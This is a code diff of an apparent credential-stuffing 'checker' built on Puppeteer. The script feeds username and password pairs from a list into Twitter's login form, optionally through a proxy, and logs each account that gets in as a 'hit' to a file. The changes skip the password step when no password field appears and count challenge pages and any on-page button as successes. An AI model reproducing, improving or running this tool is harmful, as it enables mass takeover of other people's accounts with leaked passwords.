@@ -44,7 +44,7 @@ exports.processLine = async function ({line, lap}){
 
     // open our lovely browser
     const browser = await puppeteer.launch({
-        headless: true,
+        headless: false,
         slowMo: 250,
         args: [USE_PROXY ? `--proxy-server=http=${USE_PROXY}` : '',
                 '--autoplay-policy=user-gesture-required',
@@ -115,19 +115,25 @@ exports.processLine = async function ({line, lap}){
         await page.click(NEXT_TAG)
         await delay(DELAY_TIME)
         // Focus and fast send characters - password
-        await page.focus(PSW_TAG)
-        await page.keyboard.sendCharacter(usr.password)
-        await delay(DELAY_TIME)
-        // Login action
-        await page.click(LGN_TAG)
-        await delay(DELAY_TIME)
+        const hasPassword = (await page.$(PSW_TAG)) || false;
+        if(hasPassword){
+            await page.focus(PSW_TAG)
+            await page.keyboard.sendCharacter(usr.password)
+            await delay(DELAY_TIME)
+            // Login action
+            await page.click(LGN_TAG)
+            await delay(DELAY_TIME)
+        }
         // Check url if it's OK or not
         const url = await page.evaluate(() => document.location.href);
+        const challenge = (await page.$('.css-1dbjc4n.r-1wbh5a2.r-dnmrzs')) || false;
+        const gotItBtn  = (await page.$('div[role=button].css-18t94o4.css-1dbjc4n.r-sdzlij.r-1phboty.r-rs99b7.r-1mnahxq.r-19yznuf.r-64el8z.r-1ny4l3l.r-1dye5f7.r-o7ynqc.r-6416eg.r-lrvibr')) || false;
+        const otherBtn  = (await page.$('div[role=button]')) || false;
 
         console.log(`url: ${url} - Check url`)
 
         // Success
-        if(url == TWT_HOME || url == TWT_CHALLENGE){
+        if(url == TWT_HOME || url == TWT_CHALLENGE || challenge || gotItBtn || otherBtn){
             // Save hit
             fs.appendFileSync(OUT_FILE, `${line}:${usr.userName}\n`);
             // To-Do add verified accounts check
